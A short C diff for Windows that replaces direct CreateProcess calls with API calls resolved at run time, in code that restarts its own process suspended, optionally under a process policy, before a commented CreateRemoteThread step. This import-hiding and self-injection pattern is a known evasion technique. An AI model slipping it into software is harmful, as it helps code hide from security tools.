@@ -71,10 +71,10 @@ VOID Initialze(VOID)
 		si.lpAttributeList = attr;
 
 		// Restart process with process policy (CREATE_SUSPEND)
-		CreateProcess(GetModulePath(EXE), GetCommandLine(),  NULL, NULL, NULL, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
+		((_CreateProcessW)APICall(kernel32, APICall_CreateProcessW))(GetModulePath(EXE), GetCommandLine(),  NULL, NULL, NULL, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
 #endif
 #if !(PROCESS_POLICY & ENABLE)
-		CreateProcess(GetModulePath(EXE), GetCommandLine(),  NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, (STARTUPINFO*)&si, &pi);
+		((_CreateProcessW)APICall(kernel32, APICall_CreateProcessW))(GetModulePath(EXE), GetCommandLine(),  NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, (STARTUPINFO*)&si, &pi);
 #endif
 		// CreateRemoteThread in restarted process
 		HANDLE hThread = NULL;
